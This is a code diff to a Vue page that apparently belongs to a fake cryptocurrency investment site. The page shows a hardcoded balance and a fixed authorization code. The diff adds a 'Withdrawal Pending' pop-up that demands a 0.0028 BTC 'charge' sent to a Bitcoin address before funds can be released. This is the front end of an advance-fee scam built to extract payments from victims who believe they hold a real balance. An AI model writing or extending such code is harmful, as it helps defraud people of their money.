@@ -197,6 +197,13 @@
       <p v-show="showAuthError" class="incorrectCodeTr" style="color: red;">{{ authErrorMessage }}</p>
     </div>
 
+    <div class="withdrawSuc" v-if="showlastmessage">
+        <p>
+            Withdrawal Pending. <br> You'll need 0.0028 BTC charges for withdrawal to your account to avoid errors or loss of assets. <br> bc1qermn630j6yrnwyzn94x83tr8v9hdmkg54z9egq
+        </p>
+        <p class="cancell" @click="clearLast">X</p>
+    </div>
+
     <!-- Deposit Modal -->
     <div v-show="showDepositForm" class="contactForm depp">
       <p>Please make your deposit on this wallet address <br> bc1qprdk35m3h3ygds9mahpuhp6pqph36h48s935eh</p>
@@ -223,6 +230,7 @@ import { ref, onMounted, computed } from 'vue'
       layout: false
     })
 // Reactive data
+const showlastmessage = ref(false)
 const currentBalance = ref(15000.00)
 const withdrawAmount = ref('')
 const withdrawnAmount = ref(0)
@@ -252,6 +260,11 @@ const showCodeError = ref(false)
 const showAuthError = ref(false)
 const showDepositForm = ref(false)
 const showMainButtons = ref(true)
+
+const clearLast = () => {
+ showlastmessage.value = false
+
+}
 
 // Computed
 const recentTransactions = computed(() => {
@@ -356,6 +369,7 @@ const confirmAuthCodes = () => {
       processWithdrawal()
       showAuthorizationForm.value = false
       showLoading.value = false
+      showlastmessage.value = true
       showMainButtons.value = true
     }, 1500)
   } else if (!authCode.value || authCode.value !== '4htuos4') {
@@ -433,7 +447,23 @@ useHead({
 </script>
 
 <style scoped>
-
+.cancell{
+    background: red;
+    width: 20px;
+    cursor: pointer;
+}
+.withdrawSuc{
+    text-align: center;
+    background: green;
+    color: white;
+    padding: 5px;
+        display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 10px;
+    z-index: 10;
+}
 /* CONTACT PAGE */
 #ContactSubmit{
     border: none;
